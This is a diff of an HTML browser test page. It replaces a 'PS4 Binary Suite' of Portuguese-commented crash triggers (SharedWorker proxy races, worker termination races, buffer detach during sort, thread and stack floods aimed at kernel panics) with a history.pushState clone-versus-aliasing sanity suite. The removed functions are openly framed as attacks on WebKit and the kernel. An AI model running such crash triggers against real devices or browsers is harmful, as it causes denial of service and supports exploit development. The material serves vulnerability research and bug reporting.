@@ -1,325 +1,367 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>PS4 Binary Suite</title>      
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>History.pushState Sanity Suite (Revised)</title>
 </head>
 <body>
+<h1>History.pushState Sanity Suite (Revised)</h1>
+<p>
+Objective: distinguish <b>aliasing</b> vs <b>clone</b> vs <b>cross-entry contamination</b> using deterministic, synchronized navigation.
+</p>
 
-    <div class="section">
-        <h2>TESTES NAO REPORTADOS</h2>   
-       
-        
-      
+<div>
+  <button id="btnClear">Clear Log</button>
+  <button id="btnRunRecommended">Run Recommended (1 → 2 → 3)</button>
+</div>
 
-        <button onclick="runSharedProxyDestruct()">SharedWorkerProxy Destructor Race  KERNEL PANIC(REPORTAR)</button> 
-        <button onclick="runSharedProxyRace()">SharedWorkerThreadProxy C++ Race KERNEL PANIC (REPORTAR)</button>
-        <button onclick="runSignalRace()">Worker Termination Signal Race(CRASH WEBKIT (REPORTAR))</button>
-      
-        <button onclick="runRedZoneBypass()">Stack Red Zone Bypass KERNEL PANIC</button>
-        <button onclick="runThreadTCB()">Pthread TCB Corruption (_tcb_set)KERNEL PANIC</button>        
-        <button onclick="runSignalStress()">Worker Signal Stack Corruption KERNEL PANIC</button>        
-        <button onclick="runPthreadInternal()">Pthread Internal Memory Error Trigger KERNEL PANIC</button>      
-        <button onclick="runIDWrap()">SharedWorker ID Wraparound KERNEL PANIC </button>
+<hr/>
 
-      
+<h2>Core Tests</h2>
+<div>
+  <button id="btnT1">Test 1: Variant A (state contains ArrayBuffer only)</button><br/>
+  <button id="btnT2">Test 2: Variant B (state contains TypedArray view only)</button><br/>
+  <button id="btnT3">Test 3: Variant C (state contains BOTH buffer + view)</button><br/>
+  <button id="btnT4">Test 4: Cross-entry contamination (two history entries, popstate-synced)</button><br/>
+</div>
 
-       
-                  
-     
-        
-    </div>
+<hr/>
 
-    <div id="log"></div>
-    <div id="dummy"></div>
-    <div id="sandbox"></div>
+<h2>Optional Diagnostics</h2>
+<div>
+  <button id="btnCirc">Test 5: Circular reference handling (expect DataCloneError in many engines)</button><br/>
+</div>
 
-    <script>
-        function log(msg) { 
-            const el = document.getElementById('log');
-            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            el.scrollTop = el.scrollHeight;
-        }
+<hr/>
+<pre id="log" style="white-space:pre-wrap;border:1px solid #ccc;padding:10px;min-height:220px;"></pre>
 
-         // --- 2. TypedArray.sort Buffer Detach ---
-        function runSortDetach() {
-            log("[WebKit] Iniciando Sort Detach...");
-            
-            try {
-                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
-                const array = new Uint8Array(buffer);
-                
-                // Preenche
-                for(let i=0; i<array.length; i++) array[i] = Math.random() * 255;
-                
-                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
-                
-                let detached = false;
-                
-                // O GOLPE: Função de comparação transfere o buffer
-                array.sort((a, b) => {
-                    if (!detached) {
-                        log("Comparador ativo. Transferindo buffer...");
-                        w.postMessage(buffer, [buffer]);
-                        detached = true;
-                    }
-                    return a - b;
-                });
-                
-                log("Sort finalizado (Seguro se não crashou).");
-                w.terminate();
-                
-            } catch(e) {
-                // TypeError é esperado em browsers corrigidos
-                log("Resultado: " + e.message);
-            }
-        }
+<script>
+(function () {
+  "use strict";
 
+  // ----------------------------
+  // Logging helpers
+  // ----------------------------
+  const logEl = document.getElementById("log");
+  function ts() {
+    const d = new Date();
+    const hh = String(d.getHours()).padStart(2, "0");
+    const mm = String(d.getMinutes()).padStart(2, "0");
+    const ss = String(d.getSeconds()).padStart(2, "0");
+    return `[${hh}:${mm}:${ss}]`;
+  }
+  function log(line) {
+    logEl.textContent += `${ts()} ${line}\n`;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+  function sep(title) {
+    log("\n==============================================================");
+    log(title);
+    log("==============================================================");
+  }
 
+  // ----------------------------
+  // Navigation synchronization
+  // ----------------------------
+  function waitPopstateOnce(timeoutMs) {
+    timeoutMs = timeoutMs || 2500;
+    return new Promise((resolve, reject) => {
+      let done = false;
+      const t = setTimeout(() => {
+        if (done) return;
+        done = true;
+        window.removeEventListener("popstate", onPop);
+        reject(new Error("popstate timeout"));
+      }, timeoutMs);
 
-        
+      function onPop(ev) {
+        if (done) return;
+        done = true;
+        clearTimeout(t);
+        window.removeEventListener("popstate", onPop);
+        resolve(ev);
+      }
 
+      window.addEventListener("popstate", onPop, { once: true });
+    });
+  }
 
+  async function navBackSync() {
+    const p = waitPopstateOnce();
+    history.back();
+    await p;
+  }
 
+  async function navForwardSync() {
+    const p = waitPopstateOnce();
+    history.forward();
+    await p;
+  }
 
-        // --- 7. SharedWorkerThreadProxy C++ Race ---
-        function runSharedProxyRace() {
-            log("[WebKit] Atacando SharedWorkerThreadProxy...");
-            
-            const workerCode = `
-                onmessage = (e) => {
-                    // Mantém o proxy ocupado serializando
-                    postMessage({data: new Array(10000).fill(1.1)});
-                }
-            `;
-            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
-            
-            let i = 0;
-            const interval = setInterval(() => {
-                const sw = new SharedWorker(url, "race_" + i);
-                sw.port.start();
-                sw.port.postMessage("ping");
-                
-                // O WebKit não tem sw.terminate(), mas podemos garbage collect a referência
-                // ou navegar o iframe que o contém. Aqui simulamos carga rápida.
-                
-                // Força atividade no proxy
-                sw.port.postMessage({buffer: new ArrayBuffer(1024)});
-                
-                i++;
-                if(i % 100 === 0) log(`Workers Proxy Ciclados: ${i}`);
-                if(i > 1000) clearInterval(interval);
-            }, 10);
-        }
+  // ----------------------------
+  // Data helpers
+  // ----------------------------
+  function hex32(u) {
+    return "0x" + (u >>> 0).toString(16).padStart(8, "0");
+  }
 
+  function makeU32Buffer(words) {
+    const buf = new ArrayBuffer(words.length * 4);
+    const u32 = new Uint32Array(buf);
+    for (let i = 0; i < words.length; i++) u32[i] = words[i] >>> 0;
+    return { buf, u32 };
+  }
 
-        // --- 9. SharedWorker ID Wraparound ---
-        function runIDWrap() {
-            log("[WebKit] Iniciando ID Wraparound...");
-            
-            const blob = new Blob([""], {type: "text/javascript"});
-            const url = URL.createObjectURL(blob);
-            
-            let count = 0;
-            const interval = setInterval(() => {
-                // Cria e "esquece" workers rapidamente
-                // O WebKit incrementa um contador estático para cada novo Worker
-                // Se for um uint32, demora, mas se for uint16 ou tabela hash, colide rápido.
-                for(let i=0; i<50; i++) {
-                    new SharedWorker(url, "id_" + count + "_" + i);
-                }
-                
-                count += 50;
-                if(count % 1000 === 0) log(`IDs gerados: ${count}`);
-                
-                // Em um exploit real, tentaríamos reutilizar um ID antigo
-            }, 10);
-        }
+  function snapshotU32(u32, count) {
+    const n = Math.min(count || u32.length, u32.length);
+    const out = [];
+    for (let i = 0; i < n; i++) out.push(u32[i] >>> 0);
+    return out;
+  }
 
-        // --- 10. SharedWorkerProxy Destructor Race ---
-        function runSharedProxyDestruct() {
-            log("[WebKit] Iniciando Proxy Destructor Race...");
-            
-            const workerCode = `
-                onmessage = (e) => {
-                    const port = e.ports[0];
-                    // Bombardeia a porta de volta
-                    setInterval(() => port.postMessage(new ArrayBuffer(100)), 0);
-                }
-            `;
-            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
-            
-            let i = 0;
-            const interval = setInterval(() => {
-                const mc = new MessageChannel();
-                const sw = new SharedWorker(url, "race_" + i);
-                sw.port.postMessage("init", [mc.port2]);
-                
-                // Fecha a porta local imediatamente (lado do proxy)
-                // enquanto o worker bombardeia o outro lado
-                setTimeout(() => {
-                    sw.port.close(); // Tenta invalidar o proxy
-                    mc.port1.close();
-                }, Math.random() * 10);
-                
-                i++;
-                if (i % 50 === 0) log(`Proxies destruídos: ${i}`);
-                if (i > 500) clearInterval(interval);
-            }, 20);
-        }
+  function sameArray(a, b) {
+    if (!a || !b || a.length !== b.length) return false;
+    for (let i = 0; i < a.length; i++) if ((a[i] >>> 0) !== (b[i] >>> 0)) return false;
+    return true;
+  }
 
-       
+  function describeCloneOrAlias(identitySame, beforeSame, afterWriteSame) {
+    if (identitySame && afterWriteSame) return "ALIASING (same backing store; write-through observed)";
+    if (!identitySame && beforeSame && !afterWriteSame) return "CLONE (independent copy; no write-through)";
+    if (!identitySame && beforeSame && afterWriteSame) return "SUSPICIOUS (identity differs but write-through observed)";
+    if (identitySame && !afterWriteSame) return "INCONSISTENT (identity same but no write-through; check timing / measurement)";
+    return "INDETERMINATE";
+  }
 
-        // --- 13. Worker Termination Signal Race ---
-        function runSignalRace() {
-            log("[KERNEL] Iniciando Signal Race...");
-            
-            const workerCode = `
-                onmessage = () => {
-                    // Loop infinito (bloqueia thread)
-                    while(true) {}
-                }
-            `;
-            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
-            
-            const workers = [];
-            
-            // Lança 10 workers bloqueados
-            for(let i=0; i<10; i++) {
-                const w = new Worker(url);
-                w.postMessage("start"); // Bloqueia o worker
-                workers.push(w);
-            }
-            
-            log("Workers bloqueados. Terminando e enviando mensagens...");
-            
-            // Race: Terminar vs Enviar Mensagem
-            // O Kernel está a enviar SIGKILL. Nós tentamos escrever no pipe do socket.
-            workers.forEach(w => {
-                setTimeout(() => {
-                    w.terminate(); // Envia sinal
-                    // Tenta escrever no pipe de uma thread morta/morrendo
-                    try { w.postMessage("race"); } catch(e){}
-                }, 100);
-            });
-            
-            setTimeout(() => log("Race executada."), 2000);
-        }
+  function assertLine(name, cond) {
+    log(`[ASSERT] ${name}: ${cond ? "PASS" : "FAIL"}`);
+    return !!cond;
+  }
 
-        // --- 14. Pthread Internal Memory Error Trigger ---
-        function runPthreadInternal() {
-            log("[KERNEL] Triggering Pthread Internal Error...");
-            
-            // Worker que cria e destroi SABs e usa Atomics
-            // O objetivo é corromper a estrutura interna da thread no Kernel
-            const workerCode = `
-                onmessage = (e) => {
-                    const sab = new SharedArrayBuffer(1024);
-                    const view = new Int32Array(sab);
-                    
-                    // Espera fantasma
-                    Atomics.wait(view, 0, 0, 1);
-                    
-                    // Suicídio rápido
-                    close();
-                }
-            `;
-            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
-            
-            let count = 0;
-            // Criação/Destruição de threads em velocidade máxima
-            const interval = setInterval(() => {
-                for(let i=0; i<10; i++) {
-                    const w = new Worker(url);
-                    w.postMessage("die");
-                    // Não terminamos explicitamente, deixamos o 'close()' interno e o GC agirem
-                    // Isso força o Kernel a limpar a thread naturalmente (ou falhar)
-                }
-                count += 10;
-                if (count % 1000 === 0) log(`Threads recicladas: ${count}`);
-                
-                if (count > 20000) {
-                    clearInterval(interval);
-                    log("Pthread stress finalizado.");
-                }
-            }, 10);
-        }
+  // ----------------------------
+  // Test 1/2/3: A/B/C variants
+  // ----------------------------
+  async function runVariant(variantName) {
+    sep(`TEST: ${variantName}`);
 
-        // --- 16. Stack Red Zone Bypass ---
-        function runRedZoneBypass() {
-            log("[KERNEL] Bypass Red Zone...");
-            
-            const workerCode = `
-                function deep(n) {
-                    const v = new Float64Array(128); // Usa stack
-                    if (n > 0) deep(n-1);
-                }
-                // Assim que nasce, consome stack
-                deep(500); 
-                postMessage("Done");
-            `;
-            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
-            
-            // Spawn flood
-            let count = 0;
-            const interval = setInterval(() => {
-                for(let i=0; i<20; i++) {
-                    new Worker(url).onmessage = () => {};
-                }
-                count += 20;
-                if(count > 2000) {
-                    clearInterval(interval);
-                    log("Red Zone Stress finalizado.");
-                }
-            }, 10);
-        }
+    const MAGIC = [0x12345678, 0x9ABCDEF0, 0xAAAAAAAA, 0xBBBBBBBB, 0x0C0FFEE0, 0xFEEDBEEF, 0x13579BDF, 0x2468ACE0];
+    const { buf: originalBuffer, u32: originalView } = makeU32Buffer(MAGIC);
 
-        
-        // TEST K2: Pthread TCB Corruption
-        // Alvo: "_tcb_set() failed" e "Pthread Internal Memory Error".
-        function runThreadTCB() {
-            log("[KERNEL] Attacking Thread Control Block...", "info");
-            
-            // Worker que usa muito TLS (Thread Local Storage)
-            const blob = new Blob([`
-                onmessage = () => {
-                    const x = new Intl.DateTimeFormat(); // Aloca TLS
-                    close(); // Mata thread
-                }
-            `], {type: 'application/javascript'});
-            const url = URL.createObjectURL(blob);
-            
-            let i = 0;
-            const interval = setInterval(() => {
-                // Cria e mata threads para estressar o alocador de TCB do kernel
-                for(let j=0; j<10; j++) new Worker(url).postMessage("");
-                i += 10;
-                if(i > 1000) { clearInterval(interval); log("TCB Stress finished.", "info"); }
-            }, 10);
-        }
+    log(`[SETUP] Created original buffer (${originalBuffer.byteLength} bytes). Magic[0..3]=${hex32(originalView[0])}, ${hex32(originalView[1])}, ${hex32(originalView[2])}, ${hex32(originalView[3])}`);
 
+    let state = {};
+    if (variantName === "Variant A (buffer only)") {
+      state = { buffer: originalBuffer, tag: "A" };
+    } else if (variantName === "Variant B (view only)") {
+      state = { view: originalView, tag: "B" };
+    } else {
+      state = { buffer: originalBuffer, view: originalView, tag: "C" };
+    }
 
-// TEST K2: Worker Signal Stack Corruption
-        // Alvo: Gestão de sinais (SigAction) em threads.
-        function runSignalStress() {
-            log("[KERNEL] Estressando Sinais de Thread...", "warn");
-            
-            // Script que gera erros (sinais) propositalmente
-            const blob = new Blob(["throw new Error('Boom')"], {type:'text/javascript'});
-            const url = URL.createObjectURL(blob);
-            
-            // Spamma criação de workers que morrem instantaneamente (SIGTRAP/SIGABRT interno)
-            let count = 0;
-            function spam() {
-                for(let i=0; i<10; i++) new Worker(url);
-                count += 10;
-                if(count < 500) setTimeout(spam, 10);
-                else log("Signal Stress test concluído.", "safe");
-            }
-            spam();
-        }
- 
+    try {
+      history.pushState(state, "", "#sanity_" + state.tag + "_" + Date.now());
+      log("[ACTION] pushState succeeded.");
+    } catch (e) {
+      log(`[ERROR] pushState threw: ${e && e.name ? e.name : e} (${e && e.message ? e.message : "no message"})`);
+      return;
+    }
 
-    </script>
+    const retrieved = history.state;
+    log(`[READ] Retrieved history.state tag=${retrieved && retrieved.tag ? retrieved.tag : "(missing)"}`);
+
+    let retrievedBuffer = null;
+    let retrievedView = null;
+
+    if (retrieved && retrieved.buffer instanceof ArrayBuffer) {
+      retrievedBuffer = retrieved.buffer;
+      retrievedView = new Uint32Array(retrievedBuffer);
+      log(`[INFO] Retrieved has buffer. byteLength=${retrievedBuffer.byteLength}`);
+    } else if (retrieved && retrieved.view && retrieved.view.buffer instanceof ArrayBuffer) {
+      retrievedView = retrieved.view;
+      retrievedBuffer = retrievedView.buffer;
+      log(`[INFO] Retrieved has view. view.length=${retrievedView.length}, buffer.byteLength=${retrievedBuffer.byteLength}`);
+    } else {
+      log("[FAIL] Retrieved state did not contain expected buffer/view.");
+      return;
+    }
+
+    const snapOriginalBefore = snapshotU32(originalView, 4);
+    const snapRetrievedBefore = snapshotU32(retrievedView, 4);
+
+    const beforeSame = sameArray(snapOriginalBefore, snapRetrievedBefore);
+    log(`[BASELINE] Original[0..3]=${snapOriginalBefore.map(hex32).join(", ")}`);
+    log(`[BASELINE] Retrieved[0..3]=${snapRetrievedBefore.map(hex32).join(", ")}`);
+    assertLine("Baseline values match", beforeSame);
+
+    const identitySame = (retrievedBuffer === originalBuffer);
+    log(`[IDENTITY] retrievedBuffer === originalBuffer : ${identitySame}`);
+    if (retrieved && retrieved.view) {
+      log(`[IDENTITY] retrieved.view === originalView : ${retrieved.view === originalView}`);
+    }
+
+    const W0 = 0xDEADBEEF >>> 0;
+    const W1 = 0xCAFEBABE >>> 0;
+
+    log(`[WRITE] Writing via retrievedView: [0]=${hex32(W0)} [1]=${hex32(W1)}`);
+    retrievedView[0] = W0;
+    retrievedView[1] = W1;
+
+    const snapRetrievedAfter = snapshotU32(retrievedView, 2);
+    const snapOriginalAfter = snapshotU32(originalView, 2);
+
+    const retrievedWriteObserved = (snapRetrievedAfter[0] === W0 && snapRetrievedAfter[1] === W1);
+    const writeThroughObserved = (snapOriginalAfter[0] === W0 && snapOriginalAfter[1] === W1);
+
+    assertLine("Retrieved reflects its own write", retrievedWriteObserved);
+    log(`[CHECK] After write: Retrieved[0..1]=${snapRetrievedAfter.map(hex32).join(", ")}`);
+    log(`[CHECK] After write: Original [0..1]=${snapOriginalAfter.map(hex32).join(", ")} (write-through=${writeThroughObserved})`);
+
+    const classification = describeCloneOrAlias(identitySame, beforeSame, writeThroughObserved);
+    log(`=== RESULT ===`);
+    log(`[CLASSIFICATION] ${classification}`);
+
+    if (classification.startsWith("ALIASING")) {
+      log("[NOTE] Indicates isolation/cloning expectations may be violated; does NOT by itself prove out-of-bounds memory corruption.");
+    } else if (classification.startsWith("CLONE")) {
+      log("[NOTE] Suggests normal copy semantics for this variant.");
+    } else if (classification.startsWith("SUSPICIOUS")) {
+      log("[NOTE] If identity differs but write-through is observed, re-check timing and ensure you're not reusing the same instance.");
+    }
+  }
+
+  // ----------------------------
+  // Test 4: Cross-entry contamination
+  // ----------------------------
+  async function runCrossEntryContamination() {
+    sep("TEST: Cross-entry contamination (two history entries, popstate-synced)");
+    log("[GOAL] Detect whether writes in entry A unexpectedly affect entry B without any JS references linking them.");
+
+    const A = makeU32Buffer([0xAAAAAAAA, 0xAAAAAAAA, 0xAAAAAAAA, 0xAAAAAAAA, 0x11111111, 0x11111111, 0x11111111, 0x11111111]);
+    const B = makeU32Buffer([0xBBBBBBBB, 0xBBBBBBBB, 0xBBBBBBBB, 0xBBBBBBBB, 0x22222222, 0x22222222, 0x22222222, 0x22222222]);
+
+    const tagA = "X_A_" + Date.now();
+    try {
+      history.pushState({ tag: tagA, buffer: A.buf }, "", "#"+tagA);
+      log(`[ACTION] pushState A ok (tag=${tagA})`);
+    } catch (e) {
+      log(`[ERROR] pushState A threw: ${e && e.name ? e.name : e}`);
+      return;
+    }
+
+    const tagB = "X_B_" + Date.now();
+    try {
+      history.pushState({ tag: tagB, buffer: B.buf }, "", "#"+tagB);
+      log(`[ACTION] pushState B ok (tag=${tagB})`);
+    } catch (e) {
+      log(`[ERROR] pushState B threw: ${e && e.name ? e.name : e}`);
+      return;
+    }
+
+    // Current is B
+    let cur = history.state;
+    if (!cur || !cur.buffer) {
+      log("[FAIL] Current state missing buffer.");
+      return;
+    }
+    const curViewB = new Uint32Array(cur.buffer);
+    const baseB = snapshotU32(curViewB, 2);
+    log(`[BASELINE] At B: state.tag=${cur.tag} B[0..1]=${baseB.map(hex32).join(", ")}`);
+
+    log("[NAV] history.back() -> expect to reach A");
+    try { await navBackSync(); } catch (e) { log(`[ERROR] back sync failed: ${e.message}`); return; }
+
+    cur = history.state;
+    if (!cur || !cur.buffer) {
+      log("[FAIL] After back, state missing buffer.");
+      return;
+    }
+    const curViewA = new Uint32Array(cur.buffer);
+    const baseA = snapshotU32(curViewA, 2);
+    log(`[AT A] state.tag=${cur.tag} A[0..1]=${baseA.map(hex32).join(", ")}`);
+
+    const WA0 = 0x0A0A0A0A >>> 0;
+    const WA1 = 0xF0F0F0F0 >>> 0;
+    log(`[WRITE] In A, write A[0]=${hex32(WA0)} A[1]=${hex32(WA1)}`);
+    curViewA[0] = WA0;
+    curViewA[1] = WA1;
+
+    const aAfter = snapshotU32(curViewA, 2);
+    assertLine("A reflects its own write", aAfter[0] === WA0 && aAfter[1] === WA1);
+
+    log("[NAV] history.forward() -> expect to reach B");
+    try { await navForwardSync(); } catch (e) { log(`[ERROR] forward sync failed: ${e.message}`); return; }
+
+    cur = history.state;
+    if (!cur || !cur.buffer) {
+      log("[FAIL] After forward, state missing buffer.");
+      return;
+    }
+    const viewB2 = new Uint32Array(cur.buffer);
+    const bAfter = snapshotU32(viewB2, 2);
+    log(`[AT B] state.tag=${cur.tag} B[0..1]=${bAfter.map(hex32).join(", ")}`);
+
+    const contaminated = (bAfter[0] === WA0 || bAfter[1] === WA1);
+    log("=== RESULT ===");
+    if (contaminated) {
+      log("[EVIDENCE] Cross-entry contamination observed: values written in A appear in B without direct references.");
+      log("[NOTE] Stronger evidence of isolation failure than intra-object aliasing checks.");
+    } else {
+      log("[OK] No cross-entry contamination detected in this run.");
+    }
+
+    log(`[SANITY] original A.buf === B.buf : ${A.buf === B.buf} (should be false)`);
+  }
+
+  // ----------------------------
+  // Test 5: Circular reference handling
+  // ----------------------------
+  function runCircularTest() {
+    sep("TEST: Circular reference handling");
+    const obj = { tag: "CIRC_" + Date.now() };
+    obj.self = obj;
+
+    try {
+      history.pushState(obj, "", "#circ_" + Date.now());
+      log("[ACTION] pushState accepted circular reference.");
+      const r = history.state;
+      const ok = (r && r.self === r);
+      log(`[CHECK] retrieved.self === retrieved : ${ok}`);
+      log("=== RESULT ===");
+      if (ok) {
+        log("[OBSERVATION] Circular structure appears preserved in retrieved state.");
+        log("[NOTE] Deviation from typical structured-clone expectations; not by itself proof of memory corruption.");
+      } else {
+        log("[INDETERMINATE] Circular push succeeded but cycle not preserved (implementation-specific).");
+      }
+    } catch (e) {
+      log(`[EXPECTED/OK] pushState threw: ${e && e.name ? e.name : e} (${e && e.message ? e.message : "no message"})`);
+      log("[NOTE] Many engines reject circular structures (often DataCloneError).");
+    }
+  }
+
+  // ----------------------------
+  // Wire UI
+  // ----------------------------
+  document.getElementById("btnClear").onclick = () => (logEl.textContent = "");
+  document.getElementById("btnT1").onclick = () => runVariant("Variant A (buffer only)");
+  document.getElementById("btnT2").onclick = () => runVariant("Variant B (view only)");
+  document.getElementById("btnT3").onclick = () => runVariant("Variant C (buffer + view)");
+  document.getElementById("btnT4").onclick = () => runCrossEntryContamination();
+  document.getElementById("btnCirc").onclick = () => runCircularTest();
+
+  document.getElementById("btnRunRecommended").onclick = async () => {
+    logEl.textContent = "";
+    sep("RECOMMENDED RUN ORDER: 1 → 2 → 3");
+    await runVariant("Variant A (buffer only)");
+    await runVariant("Variant B (view only)");
+    await runCrossEntryContamination();
+    log("\nDone.");
+  };
+
+  sep("READY");
+  log("Tip: Run 'Recommended' first. Capture logs per variant when reporting.");
+})();
+</script>
 </body>
 </html>
